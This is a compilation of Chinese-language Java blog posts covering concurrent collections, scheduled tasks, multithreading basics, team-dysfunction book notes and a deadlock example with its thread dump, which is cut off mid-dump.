关键字：Hashtable、synchronizedMap、ConcurrentHashMap 深度比较  util.concurrent 包除了包含许多其他有用的并发构造块之外，还包含了一些主要集合类型List和Map的高性能的、线程安全的实现。Brian Goetz向您展示了用ConcurrentHashMap替换Hashtable或synchronizedMap，将有多少并发程序获益。在 Java类库中出现的第一个关联的集合类是Hashtable，它是JDK 1.0的一部分。Hashtable提供了一种易于使用的、线程安全的、关联的map功能，这当然也是方便的。然而，线程安全性是凭代价换来的—— Hashtable的所有方法都是同步的。 此时，无竞争的同步会导致可观的性能代价。Hashtable的后继者HashMap是作为JDK1.2中的集合框架的一部分出现的，它通过提供一个不同 步的基类和一个同步的包装器Collections.synchronizedMap，解决了线程安全性问题。 通过将基本的功能从线程安全性中分离开来，Collections.synchronizedMap允许需要同步的用户可以拥有同步，而不需要同步的用户 则不必为同步付出代价。 Hashtable 和 synchronizedMap所采取的获得同步的简单方法（同步Hashtable中或者同步的Map包装器对象中的每个方法）有两个主要的不足。首 先，这种方法对于可伸缩性是一种障碍，因为一次只能有一个线程可以访问hash表。 同时，这样仍不足以提供真正的线程安全性，许多公用的混合操作仍然需要额外的同步。虽然诸如get() 和 put()之类的简单操作可以在不需要额外同步的情况下安全地完成，但还是有一些公用的操作序列 ，例如迭代或者put-if-absent（空则放入），需要外部的同步，以避免数据争用。 有条件的线程安全性同步的集合包 装器 synchronizedMap 和 synchronizedList，有时也被称作有条件地线程安全——所有 单个的操作都是线程安全的，但是多个操作组成的操作序列却可能导致数据争用，因为在操作序列中控制流取决于前面操作的结果。 清单1中第一片段展示了公用的put-if-absent语句块——如果一个条目不在Map中，那么添加这个条目。不幸的是， 在containsKey()方法返回到put() 方法被调用这段时间内，可能会有另一个线程也插入一个带有相同键的值。如果您想确保只有一次插入，您需要用一个对Map m进行同步的同步块将这一对语句包装起来。 清单1中其他的例子与迭代有关。在第一个例子中，List.size() 的结果在循环的执行期间可能会变得无效，因为另一个线程可以从这个列表中删除条目。如果时机不得当，在刚好进入循环的最后一次迭代之后有一个条目被另一个 线程删除 了，则List.get()将返回null，而doSomething() 则很可能会抛出一个NullPointerException异常。那么，采取什么措施才能避免这种情况呢？如果当您正在迭代一个List 时另一个线程也 可能正在访问这个 List，那么在进行迭代时您必须使用一个synchronized 块将这个List 包装起来， 在List 1 上同步，从而锁住整个List。这样做虽然解决了数据争用问题，但是在并发性方面付出了更多的代价，因为在迭代期间锁住整个List会阻塞其他线程，使它 们在很长一段时间内不能访问这个列表。 集合框架引入了迭代器，用于遍历一个列表或者其他集合，从而优化了对一个集合中的元素进行迭代的 过程。然而，在java.util 集合类中实现的迭代器极易崩溃，也就是说，如果在一个线程正在通过一个Iterator遍历集合时，另一个线程也来修改这个 集合，那么接下来的Iterator.hasNext() 或 Iterator.next()调用将抛出ConcurrentModificationException异常。就拿 刚才这个例子来讲，如果想要防止出现ConcurrentModificationException异常，那么当您正在进行迭代时，您必须 使用一个在 List l上同步的synchronized块将该 List 包装起来，从而锁住整个 List。（或者，您也可以调用List.toArray()，在 不同步的情况下对数组进行迭代，但是如果列表比较大的话这样做代价很高）。 清单 1. 同步的map中的公用竞争条件            Map m = Collections.synchronizedMap(new HashMap());            List l = Collections.synchronizedList(new ArrayList());            // put-if-absent idiom -- contains a race condition            // may require external synchronization            if (!map.containsKey(key))            map.put(key, value);            // ad-hoc iteration -- contains race conditions            // may require external synchronization            for (int i=0; i<list.size(); i++) {            doSomething(list.get(i));            }            // normal iteration -- can throw ConcurrentModificationException            // may require external synchronization            for (Iterator i=list.iterator(); i.hasNext(); ) {            doSomething(i.next());            }                          信任的错觉synchronizedList 和 synchronizedMap提供的有条件的线程安全性也带来了一个隐患——开发者会假设，因为这些集合都是同步的，所以它们都是线程安全的，这样一来 他们对于正确地同步混合操作这件事就会疏忽。其结果是尽管表面上这些程序在负载较轻的时候能够正常工作，但是一旦负载较重，它们就会开始抛出 NullPointerException 或 ConcurrentModificationException。 可伸缩性问题可 伸缩性指的是一个应用程序在工作负载和可用处理资源增加时其吞吐量的表现情况。一个可伸缩的程序能够通过使用更多的处理器、内存或者I/O带宽来相应地处 理更大的工作负载。锁住某个共享的资源以获得独占式的访问这种做法会形成可伸缩性瓶颈——它使其他线程不能访问那个资源，即使有空闲的处理器可以调用那些 线程也无济于事。为了取得可伸缩性，我们必须消除或者减少我们对独占式资源锁的依赖。 同步的集合包装器以及早期的Hashtable 和 Vector类带来的更大的问题是，它们在单个的锁 上进行同步。这意味着一次只有一个线程可以访问集合，如果有一个线程正在读一个Map，那么所有其他想要读或者写这个Map的线程就必须等待。最常见的 Map操作，get() 和 put()，可能比表面上要进行更多的处理——当遍历一个hash表的bucket以期找到某一特定的key时，get()必须对大量的候选bucket 调用Object.equals()。如果key类所使用的hashCode()函数不能将value均匀地分布在整个hash表范围内，或者存在大量的 hash冲突，那么某些bucket链就会比其他的链长很多，而遍历一个长的hash链以及对该hash链上一定百分比的元素调用 equals()是一件很慢的事情。在上述条件下，调用 get() 和 put() 的代价高的问题不仅仅是指访问过程的缓慢，而且，当有线程正在遍历那个hash链时，所有其他线程都被锁在外面，不能访问这个Map。 （哈 希表根据一个叫做hash的数字关键字（key）将对象存储在bucket中。hash value是从对象中的值计算得来的一个数字。每个不同的hash value都会创建一个新的bucket。要查找一个对象，您只需要计算这个对象的hash value并搜索相应的bucket就行了。通过快速地找到相应的bucket，就可以减少您需要搜索的对象数量了。译者注） get() 执行起来可能会占用大量的时间，而在某些情况下，前面已经作了讨论的有条件的线程安全性问题会让这个问题变得还要糟糕得多。清单1 中演示的争用条件常常使得对单个集合的锁在单个操作执行完毕之后还必须继续保持一段较长的时间。如果您要在整个迭代期间都保持对集合的锁，那么其他的线程 就会在锁外停留很长的一段时间，等待解锁。 实例：一个简单的cacheMap在服务器应用中最常见的应用之一就是实现一个 cache。服务器应用可能需要缓存文件内容、生成的页面、数据库查询的结果、与经过解析的XML文件相关的DOM树，以及许多其他类型的数据。 cache的主要用途是重用前一次处理得出的结果 以减少服务时间和增加吞吐量。cache工作负载的一个典型的特征就是检索大大多于更新，因此（理想情况下）cache能够提供非常好的get()性能。 不过，使用会 妨碍性能的cache还不如完全不用cache。 如果使用 synchronizedMap 来实现一个cache，那么您就在您的应用程序中引入了一个潜在的可伸缩性瓶颈。因为一次只有一个线程可以访问Map，这 些线程包括那些要从Map中取出一个值的线程以及那些要将一个新的(key, value)对插入到该map中的线程。 减小锁粒度提 高HashMap的并发性同时还提供线程安全性的一种方法是废除对整个表使用一个锁的方式，而采用对hash表的每个bucket都使用一个锁的方式（或 者，更常见的是，使用一个锁池，每个锁负责保护几个bucket） 。这意味着多个线程可以同时地访问一个Map的不同部分，而不必争用单个的集合范围的锁。这种方法能够直接提高插入、检索以及移除操作的可伸缩性。不幸的 是，这种并发性是以一定的代价换来的——这使得对整个 集合进行操作的一些方法（例如 size() 或 isEmpty()）的实现更加困难，因为这些方法要求一次获得许多的锁，并且还存在返回不正确的结果的风险。然而，对于某些情况，例如实现cache， 这样做是一个很好的折衷——因为检索和插入操作比较频繁，而 size() 和 isEmpty()操作则少得多。 ConcurrentHashMaputil.concurrent 包中的ConcurrentHashMap类（也将出现在JDK 1.5中的java.util.concurrent包中）是对Map的线程安全的实现，比起synchronizedMap来，它提供了好得多的并发 性。多个读操作几乎总可以并发地执行，同时进行的读和写操作通常也能并发地执行，而同时进行的写操作仍然可以不时地并发进行（相关的类也提供了类似的多个 读线程的并发性，但是，只允许有一个活动的写线程）。ConcurrentHashMap被设计用来优化检索操作；实际上，成功的 get() 操作完成之后通常根本不会有锁着的资源。要在不使用锁的情况下取得线程安全性需要一定的技巧性，并且需要对Java内存模型（Java Memory Model）的细节有深入的理解。ConcurrentHashMap实现，加上util.concurrent包的其他部分，已经被研究正确性和线程安 全性的并发专家所正视。在下个月的文章中，我们将看看ConcurrentHashMap的实现的细节。 ConcurrentHashMap 通过稍微地松弛它对调用者的承诺而获得了更高的并发性。检索操作将可以返回由最近完成的插入操作所插入的值，也可以返回在步调上是并发的插入操作所添加的 值（但是决不会返回一个没有意义的结果）。由ConcurrentHashMap.iterator()返回的Iterators将每次最多返回一个元 素，并且决不会抛出ConcurrentModificationException异常，但是可能会也可能不会反映在该迭代器被构建之后发生的插入操作 或者移除操作。在对 集合进行迭代时，不需要表范围的锁就能提供线程安全性。在任何不依赖于锁整个表来防止更新的应用程序中，可以使用ConcurrentHashMap来替 代synchronizedMap或Hashtable。 上述改进使得ConcurrentHashMap能够提供比Hashtable高得多的可伸缩性，而且，对于很多类型的公用案例（比如共享的cache）来说，还不用损失其效率。 好了多少？表 1对Hashtable 和 ConcurrentHashMap的可伸缩性进行了粗略的比较。在每次运行过程中，n 个线程并发地执行一个死循环，在这个死循环中这些线程从一个Hashtable 或者 ConcurrentHashMap中检索随机的key value，发现在执行put()操作时有80%的检索失败率，在执行操作时有1%的检索成功率。测试所在的平台是一个双处理器的Xeon系统，操作系统 是Linux。数据显示了10,000,000次迭代以毫秒计的运行时间，这个数据是在将对ConcurrentHashMap的操作标准化为一个线程的 情况下进行统计的。您可以看到，当线程增加到多个时，ConcurrentHashMap的性能仍然保持上升趋势，而Hashtable的性能则随着争用 锁的情况的出现而立即降了下来。 比起通常情况下的服务器应用，这次测试中线程的数量看上去有点少。然而，因为每个线程都在不停地对表进行操作，所以这与实际环境下使用这个表的更多数量的线程的争用情况基本等同。 表 1.Hashtable 与 ConcurrentHashMap在可伸缩性方面的比较 线程数 ConcurrentHashMap Hashtable1 1.00 1.032 2.59 32.404 5.58 78.238 13.21 163.4816 27.58 341.2132 57.27 778.41   CopyOnWriteArrayList在 那些遍历操作大大地多于插入或移除操作的并发应用程序中，一般用CopyOnWriteArrayList类替代ArrayList。如果是用于存放一个 侦听器（listener）列表，例如在AWT或Swing应用程序中，或者在常见的JavaBean中，那么这种情况很常见（相关的 CopyOnWriteArraySet使用一个CopyOnWriteArrayList来实现Set接口） 。 如果您正在使用一个 普通的ArrayList来存放一个侦听器列表，那么只要该列表是可变的，而且可能要被多个线程访问，您 就必须要么在对其进行迭代操作期间，要么在迭代前进行的克隆操作期间，锁定整个列表，这两种做法的开销都很大。当对列表执行会引起列表发生变化的操作 时，CopyOnWriteArrayList并不是为列表创建一个全新的副本，它的迭代器肯定能够返回在迭代器被创建时列表的状态，而不会抛出 ConcurrentModificationException。在对列表进行迭代之前不必克隆列表或者在迭代期间锁 定列表，因为迭代器所看到的列表的副本是不变的。换句话说，CopyOnWriteArrayList含有对一个不可变数组的一个可变的引用，因此，只要 保留好那个引用，您就可以获得不可变的线程安全性的好处，而且不用锁 定列表。 结束语同步的集合类Hashtable 和 Vector，以及同步的包装器类 Collections.synchronizedMap 和 Collections.synchronizedList，为Map 和 List提供了基本的有条件的线程安全的实现。然而，某些因素使得它们并不适用于具有高度并发性的应用程序中——它们的 集合范围的单锁特性对于可伸缩性来说是一个障碍，而且，很多时候还必须在一段较长的时间内锁定一个集合，以防止出现 ConcurrentModificationExceptions异常。 ConcurrentHashMap 和 CopyOnWriteArrayList实现提供了更高的并发性，同时还保住了线程安全性，只不过在对其调用者的承诺上打了点折扣。 ConcurrentHashMap 和 CopyOnWriteArrayList并不是在您使用HashMap 或 ArrayList的任何地方都一定有用，但是它们是设计用来优化某些特定的公用解决方案的。许多并发应用程序将从对它们的使用中获得好处。   精品时尚包包，男女各种新款式，欢迎前来精品时尚包包，男女各种新款式，欢迎前来  
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java实现定时任务的三种方法, rijin.iteye.com.blog.2042335, Wed, 09 Apr 2014 10:40:26 +0800

在应用里经常都有用到在后台跑定时任务的需求。举个例子，比如需要在服务后台跑一个定时任务来进行垃圾回收（译者注：个人觉得用定时任务来跑垃圾回收不是很好的例子，从译者接触到的项目来看，比较常见的是用定时任务来进行非实时计算，清除临时数据、文件等）。
在本文里，我会给大家介绍3种不同的实现方法：
普通thread实现
TimerTask实现
ScheduledExecutorService实现
普通thread
这是最常见的，创建一个thread，然后让它在while循环里一直运行着，通过sleep方法来达到定时任务的效果。这样可以快速简单的实现，代码如下：
public class Task1 {
public static void main(String[] args) {
  // run in a second
  final long timeInterval = 1000;
  Runnable runnable = new Runnable() {
  public void run() {
    while (true) {
      // ------- code for task to run
      System.out.println("Hello !!");
      // ------- ends here
      try {
       Thread.sleep(timeInterval);
      } catch (InterruptedException e) {
        e.printStackTrace();
      }
      }
    }
  };
  Thread thread = new Thread(runnable);
  thread.start();
  }
}
用Timer和TimerTask
上面的实现是非常快速简便的，但它也缺少一些功能。用Timer和TimerTask的话与上述方法相比有如下好处：
当启动和去取消任务时可以控制
第一次执行任务时可以指定你想要的delay时间
在实现时，Timer类可以调度任务，TimerTask则是通过在run()方法里实现具体任务。Timer实例可以调度多任务，它是线程安全的。当Timer的构造器被调用时，它创建了一个线程，这个线程可以用来调度任务。下面是代码：
import java.util.Timer;
import java.util.TimerTask;
public class Task2 {
  public static void main(String[] args) {
    TimerTask task = new TimerTask() {
      @Override
      public void run() {
        // task to run goes here
        System.out.println("Hello !!!");
      }
    };
    Timer timer = new Timer();
    long delay = 0;
    long intevalPeriod = 1 * 1000;
    // schedules the task to be run in an interval
    timer.scheduleAtFixedRate(task, delay,
                                intevalPeriod);
  } // end of main
}
这些类从JDK 1.3开始存在。
ScheduledExecutorService
ScheduledExecutorService是从Java SE 5的java.util.concurrent里，做为并发工具类被引进的，这是最理想的定时任务实现方式。相比于上两个方法，它有以下好处：
相比于Timer的单线程，它是通过线程池的方式来执行任务的
可以很灵活的去设定第一次执行任务delay时间
提供了良好的约定，以便设定执行的时间间隔
下面是实现代码，我们通过ScheduledExecutorService#scheduleAtFixedRate展示这个例子，通过代码里参数的控制，首次执行加了delay时间。
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
public class Task3 {
  public static void main(String[] args) {
    Runnable runnable = new Runnable() {
      public void run() {
        // task to run goes here
        System.out.println("Hello !!");
      }
    };
    ScheduledExecutorService service = Executors
                    .newSingleThreadScheduledExecutor();
    service.scheduleAtFixedRate(runnable, 0, 1, TimeUnit.SECONDS);
  }
}
英文原文在这。由newhottopic.com翻译
已有 5 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java开发者应该列入年度计划的5件事, rijin.iteye.com.blog.2041087, Fri, 04 Apr 2014 14:15:44 +0800

本文写了我今年计划要做的5件事。为了能跟踪计划执行的进度，就把这些事都列了出来。我觉得这些事对其它Java开发者而言也是不错的参考方向。
1.开发一个应用，通过Java来操作一种NoSQL数据库实现存储
如果你还没接触过NoSQL数据库，现在就是学习的最佳时机了。目前流行的NoSQL数据库有很多种，MongoDB或者Hadoop也许都是不错的入门选择。我们可以开发一个应用，通过Spring Data，或者原生Java提供的方法来连接上NoSQL数据库，并且对其进行各种操作。
2.在Java Paas云平台上实现一个应用，并邀请你5位朋友来使用
你有很多这种云平台可以选择：包括由JBoss和Redhat支撑的Openshift，或者由Spring和VMware支撑的CloudFoundry。云端是未来应用的部署方向，也将使得软件服务的获取变的越来越流行。当然，从一个开发者的角度来看，除了配置和部署以外，并没有本质的变化。
3.什么是真正的软件设计？
阅读大名鼎鼎的GOF设计模式，并且在你的实际项目中找出这些模式。如果你的项目并没有用上，就检查下看是否用上了类似的思想。如果你的项目是Java企业应用，你可以检查下是否用上了JavaEE的模式。通过已有的Use case来思考，是否有其它更好的实现方式。
4.学习一门新的编程语言，并用它编写一个sample project
我觉得在这件事中，有两种广泛的选择：Ruby或者一种在JVM里运行的函数式编程语言。现在已经有大量的函数式编程语言可供选择。实现好这点计划，将让你成为一名通晓多门语言的程序员。
5.为社区做贡献
你应该已经在做或者做了很久这件事才对。如果还没有那就赶紧行动起来吧。有太多的方法可以实现：社区论坛、Stackoverflow或者写博客来记录你是怎么学习的。（译者注：原文作者指的社区贡献应该不只针对平时提到的开源社区，其本意应该是你可以通过各种途径来做分享、帮助那些你能帮助到的开发者）
英文原文在这。由newhottopic.com翻译
已有 6 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java多线程程序设计小记, rijin.iteye.com.blog.2038158, Fri, 28 Mar 2014 23:59:04 +0800

一、什么是线程
基础知识。线程是CPU调度的最小单元。一个线程可以看作是在执行一个任务。除创建和销毁，线程的生命周期还包括就绪、运行、阻塞。
二、多线程的工作原理
CPU是按时间片来运行任务的，多个线程都有机会获得时间片，这样多个任务就可以并发地执行。线程间的切换会涉及到上下文保存的开销。由于线程间共享进程内的数据资源，故线程切换的开销比进程切换的开销要小很多。在大多数通用的处理器中，上下文切换的开销相当于5000到10000个时钟周期。
因为大多时候一个线程不可能满负荷地占用CPU，会有一些IO或接口调用的操作，这个时候CPU是空闲的，就可以切换别的线程执行，从而大大地提高效率和并发量。
三、如何使用多线程
创建并启动多个线程就可以实现多线程，你大致可以通过以下三种方式：
new Thread(Runnable).start();
ExecutorService.execute(Runnable);
Future<?> = ExecutorService.submit(Callable<?>);
如何获得ExecutorService，如下。区别很明显，具体含义参见API。
Executors.newSingleThreadExecutor();
Executors.newCachedThreadPool();
Executors.newFixedThreadPool(nThreads);
Executors.newScheduledThreadPool(corePoolSize);
除了简单的创建并启动，你还可以通过ScheduledExecutorService来调度你的线程，你可以让线程等待多长时间启动，并多久循环，使用很简单，具体参见API。
四、多线程带来的问题
除线程切换开销外，最大的问题就是多个线程竞争共享资源时，可能会破坏共享资源，因为很多操作都不是原子的。比如A正在写共享资源G，可能还未写完B就来读，得到不正确的G；可能B读完还要写入，导致G被破坏。即使能保证共享资源不被破坏，也可能根据共享状态作判断的时候取不到正确时机的状态而判断错误。比如A在时刻1取到共享状态G为true，当执行过程中可能G被B修改为了false，A后续依赖B为true的操作将是错误的。
为了解决线程安全，程序设计会变得复杂，同时避免不了对共享资源进行锁定，这样阻塞会更频繁，可能还会死锁。死锁的四个必要条件：互斥、持有并等待、非抢占式、循环等待。
总之，多线程会给你带来莫名其妙的问题，状态出错、数据出错、或者偶尔的性能下降。
五、如何保证线程安全
1. 线程内部的资源是线程安全的。
2. 只读资源是线程安全的。
3. 对共享资源操作方法或代码块使用同步synchronized，保证同一时刻只有一个线程访问共享资源，是线程安全的。
4. 当一个线程将对共享资源进行写操作时或者后续操作依赖读操作的结果时，先获取资源的锁(trylock)，对资源进行锁定，操作完后释放锁，可以保证线程安全。
六、多线程优化思路
逐步从以下几个方面去考虑：
1. 是否一定要使用多线程，是否一定要共享资源。
2. 避免热点域成为共享的竞争资源。
3. 避免使用独占锁，寻找可行的替代方式，如依赖concurrent包中的数据结构(最好了解其实现)，采用读写锁等。
4. 避免对大段操作加锁，缩小锁的范围，快进快出。
5. 避免对大量数据加锁，减少锁的粒度，进行分拆和分离。
6. 监控CPU利用率、内存占有和释放情况(GC)来进行分析。
 
文章首发于：www.newhottopic.com
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
读书笔记：团队的五种机能障碍, rijin.iteye.com.blog.2037434, Thu, 27 Mar 2014 11:58:26 +0800

前言：很喜欢节假日，可以睡个好觉，泡杯清茶，懒懒地躺沙发上放音乐看书，眼累了练练吉它唱唱歌，好像只有这个时候自己才完全属于自已。今天看了本《团队的五种机能障碍》，全书大部分内容以一个虚构而真实的故事讲解如何建立一个目标一致、团结协作的团队，处理团队中的问题和矛盾。团队领导需具备充分的自信，控制自己的情绪，拥有理性清晰的思路，科学体系的方法论，高超的人际沟通技巧，丰富的个人阅历及对生活深刻的思考。在采取行动前，先深入观察，了解团队成员的经历和优缺点，倾听其他人的评价。对于影响团队整体绩效的缺点，通过具体的事情引导团队认识到并表达出来，在这个过程中冲突是在所难免的。
第一项机能障碍：缺乏信任
信任指团队成员相信他们的同事的言行是出于好意，是为了达到团队共同的目标，不必过分小心或戒备，不用相互猜忌。一个彼此充分信任的团队成员敢于承认自己的弱点和错误，主动寻求别人的帮助，欢迎别人对自己所负责的领域提出问题和给予关注，在工作可能出现问题时相互提醒注意，愿意给别人提出反馈意见和帮助，赞赏并且相互学习各自的技术和经验，把时间和精力花在解决实现问题而不是形式主义上，必要时向别人道歉，接受别人的道歉，珍惜集体会议或其他团队协作的机会。
第二项机能障碍：惧怕冲突
良好而持久的合作关系需要积极的冲突和争论来促使其前进。积极的争论仅限于所持观点不同，不针对个人，不存在人身攻击。争论的目的是为了在最短的时间里更彻底地讨论问题，找到最好的解决方案，并由于充分表述了自己的观点，所以在达成一致后能更有效地去执行。团队领导要有意识地挖掘有价值的能引起争论的话题，不要过早地干预和打断。
第三项机能障碍：欠缺投入
欠缺投入就不能达成共识，产生模棱两可的决策。大家可以争论，可以有不同的意见，但一旦达成一致团队就要贯彻地执行。不用追求绝对一致，一个理性的人并不是要大家都接受自己的意见，而只是要求别人确实倾听自己的想法并予以考虑。优秀的团队确保大家真正听取每名成员的意见，这样大家就愿意遵守最后的决定，不论这个决定是不是自己最初提出的。当讨论陷入僵局而无法达成一致时，团队领导有权做出最终决定。不要要求绝对把握，能够做出决定胜过没有决定。制定出明确的工作方向和工作重点，公平听取全体成员的意见，培养从失误中学习的能力。
第四项机能障碍：逃避责任
逃避责任是指团队成员在看到同事的表现或行为有碍于团队集体利益时，能够给予提醒。确保让表现不尽如人意的成员感到压力，尽快改进工作，发现潜在问题时毫无顾虑地向同事提出，尊重团队里以高标准要求工作的同事。明确公布团队的工作目标和标准，每名成员负责的工作，以及大家为取得成功需要做的事。目标和职责模糊不清是责任的大敌。定期进行简要成果回顾，必要的制度可以督促人们做他们不愿意做的事。将个人表现奖励转化为团队嘉奖，建立共同的荣辱感。
第五项机能障碍：无视结果
无视结果指团队成员以自我为中心，更关注集体工作目标以外的事情。一个优秀团队的成员必须把集体利益放在个人目标之上。避免产生企业中官僚主义：一个人所说的话和所做的事是为了让其他人按其期望的那样做出反应，而不是出于他们真正的想法。
感谢同事北灵投稿。首发于博客：newhottopic.com
已有 4 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java出现死锁了？, rijin.iteye.com.blog.2036290, Tue, 25 Mar 2014 11:46:11 +0800

死锁是指在程序里出现两个或两个以上的线程永远被堵塞住，出现这种情况的前提是至少有两个线程和两个或更多的公共资源。下面是我写的一个简单的会产生死锁现象的例子，我们来分析下它的原理：Java死锁例子
package com.journaldev.threads;
public class ThreadDeadlock {
    public static void main(String[] args) throws InterruptedException {
        Object obj1 = new Object();
        Object obj2 = new Object();
        Object obj3 = new Object();
        Thread t1 = new Thread(new SyncThread(obj1, obj2), "t1");
        Thread t2 = new Thread(new SyncThread(obj2, obj3), "t2");
        Thread t3 = new Thread(new SyncThread(obj3, obj1), "t3");
        t1.start();
        Thread.sleep(5000);
        t2.start();
        Thread.sleep(5000);
        t3.start();
    }
}
class SyncThread implements Runnable{
    private Object obj1;
    private Object obj2;
    public SyncThread(Object o1, Object o2){
        this.obj1=o1;
        this.obj2=o2;
    }
    @Override
    public void run() {
        String name = Thread.currentThread().getName();
        System.out.println(name + " acquiring lock on "+obj1);
        synchronized (obj1) {
         System.out.println(name + " acquired lock on "+obj1);
         work();
         System.out.println(name + " acquiring lock on "+obj2);
         synchronized (obj2) {
            System.out.println(name + " acquired lock on "+obj2);
            work();
        }
         System.out.println(name + " released lock on "+obj2);
        }
        System.out.println(name + " released lock on "+obj1);
        System.out.println(name + " finished execution.");
    }
    private void work() {
        try {
            Thread.sleep(30000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
 在上面的例子里，SyncThread类实现了Runnable接口，并且通过同步块来顺序锁住两个Objects才能正常运行下去。在main方法里，我有三个线程在跑SyncThread，并且让其相互之间有共享资源。这三个线程运行起来后会出现这么一种情况：某个线程可以给第一个object加锁后继续运行，但紧接着当它试着给第二个object加锁时，有可能第二个object已经被另一线程加锁了，所以不得不进入等待状态。这样就有可能在各线程之间形成一种对公共资源的循环依赖，从而导致出现死锁。当我执行上面代码时，输出如下。可以看到程序因为死锁终止了。
t1 acquiring lock on java.lang.Object@6d9dd520
t1 acquired lock on java.lang.Object@6d9dd520
t2 acquiring lock on java.lang.Object@22aed3a5
t2 acquired lock on java.lang.Object@22aed3a5
t3 acquiring lock on java.lang.Object@218c2661
t3 acquired lock on java.lang.Object@218c2661
t1 acquiring lock on java.lang.Object@22aed3a5
t2 acquiring lock on java.lang.Object@218c2661
t3 acquiring lock on java.lang.Object@6d9dd520
 在这个小例子里我们可以清楚的看到死锁，不过在实际应用中想要发现死锁并且调试它，是非常困难的。分析死锁想分析死锁，我们需要看下应用里dump出来的Java线程情况。我们可以通过VisualVM profiler或者jstack来dump。下面是dump出来的以上死锁现场的数据。
2012-12-27 19:08:34
Full thread dump Java HotSpot(TM) 64-Bit Server VM (23.5-b02 mixed mode):
"Attach Listener" daemon prio=5 tid=0x00007fb0a2814000 nid=0x4007 waiting on condition [0x0000000000000000]
   java.lang.Thread.State: RUNNABLE
"DestroyJavaVM" prio=5 tid=0x00007fb0a2801000 nid=0x1703 waiting on condition [0x0000000000000000]
   java.lang.Thread.State: RUNNABLE
"t3" prio=5 tid=0x00007fb0a204b000 nid=0x4d07 waiting for monitor entry [0x000000015d971000]
   java.lang.Thread.State: BLOCKED (on object monitor)
	at com.journaldev.threads.SyncThread.run(ThreadDeadlock.java:41)
	- waiting to lock <0x000000013df2f658> (a java.lang.Object)
	- locked <0x000000013df2f678> (a java.lang.Object)
	at java.lang.Thread.run(Thread.java:722)
"t2" prio=5 tid=0x00007fb0a1073000 nid=0x4207 waiting for monitor entry [0x000000015d209000]
   java.lang.Thread.State: BLOCKED (on object monitor)
	at com.journaldev.threads.SyncThread.run(ThreadDeadlock.java:41)
	- waiting to lock <0x000000013df2f678> (a java.lang.Object)
	- locked <0x000000013df2f668> (a java.lang.Object)
	at java.lang.Thread.run(Thread.java:722)
"t1" prio=5 tid=0x00007fb0a1072000 nid=0x5503 waiting for monitor entry [0x000000015d86e000]
   java.lang.Thread.State: BLOCKED (on object monitor)
	at com.journaldev.threads.SyncThread.run(ThreadDeadlock.java:41)
	- waiting to lock <0x000000013df2f668> (a java.lang.Object)
	- locked <0x000000013df2f658> (a java.lang.Object)
	at java.lang.Thread.run(Thread.java:722)
"Service Thread" daemon prio=5 tid=0x00007fb0a1038000 nid=0x5303 runnable [0x0000000000000000]
   java.lang.Thread.State: RUNNABLE
"C2 CompilerThread1" daemon prio=5 tid=0x00007fb0a1037000 nid=0x5203 waiting on condition [0x0000000000000000]
   java.lang.Thread.State: RUNNABLE
"C2 CompilerThread0" daemon prio=5 tid=0x00007fb0a1016000 nid=0x5103 waiting on condition [0x0000000000000000]
   java.lang.Thread.State: RUNNABLE
"Signal Dispatcher" daemon prio=5 tid=0x00007fb0a4003000 nid=0x5003 runnable [0x0000000000000000]
   java.lang.Thread.State: RUNNABLE
"Finalizer" daemon prio=5 tid=0x00007fb0a4800000 nid=0x3f03 in Object.wait() [0x000000015d0c0000]
   java.lang.Thread.State: WAITING (on object monitor)
	at java.lang.Object.wait(Native Method)
	- waiting on <0x000000013de75798> (a java.lang.ref.ReferenceQueue$Lock)
	at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:135)
	- locked <0x000000013de75798> (a java.lang.ref.ReferenceQueue$Lock)
	at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:151)
	at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:177)
"Reference Handler" daemon prio=5 tid=0x00007fb0a4002000 nid=0x3e03 in Object.wait() [0x000000015cfbd000]
   java.lang.Thread.State: WAITING (on object monitor)
	at java.lang.Object.wait(Native Method)
	- waiting on <0x000000013de75320> (a java.lang.ref.Reference$Lock)
	at java.lang.Object.wait(Object.java:503)
	at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:133)
	- locked <0x000000013de75320> (a java.lang.ref.Reference$Lock)
"VM Thread" prio=5 tid=0x00007fb0a2049800 nid=0x3d03 runnable
"GC task thread#0 (ParallelGC)" prio=5 tid=0x00007fb0a300d800 nid=0x3503 runnable
"GC task thread#1 (ParallelGC)" prio=5 tid=0x00007fb0a2001800 nid=0x3603 runnable
"GC task thread#2 (ParallelGC)" prio=5 tid=0x00007fb0a2003800 nid=0x3703 runnable
"GC task thread#3 (ParallelGC)" prio=5 tid=0x00007fb0a2004000 nid=0x3803 runnable
"GC task thread#4 (ParallelGC)" prio=5 tid=0x00007fb0a2005000 nid=0x3903 runnable
"GC task thread#5 (ParallelGC)" prio=5 tid=0x00007fb0a2005800 nid=0x3a03 runnable
"GC task thread#6 (ParallelGC)" prio=5 tid=0x00007fb0a2006000 nid=0x3b03 runnable
"GC task thread#7 (ParallelGC)" prio=5 tid=0x00007fb0a2006800 nid=0x3c03 runnable
"VM Periodic Task Thread" prio=5 tid=0x00007fb0a1015000 nid=0x5403 waiting on condition
JNI global references: 114
Found one Java-level deadlock:
=============================
"t3":
  waiting to lock monitor 0x00007fb0a1074b08 (object 0x000000013df2f658, a java.lang.Object),
  which is held by "t1"
"t1":
  waiting to lock monitor 0x00007fb0a1010f08 (object 0x000000013df2f668, a java.lang.Object),
  which is held by "t2"
"t2":
  waiting to lock monitor 0x00007fb0a1012360 (object 0x000000013df2f678, a java.lang.Object),
  which is held by "t3"
Java stack information for the threads listed above:
===================================================
"t3":
	at com.journaldev.threads.SyncThread.run(ThreadDeadlock.java:41)
	- waiting to lock <0x000000013df2f658> (a java.lang.Object)
	- locked <0x000000013df2f678> (a java.lang.Object)
	at java.lang.Thread.run(Thread.java:722)
"t1":
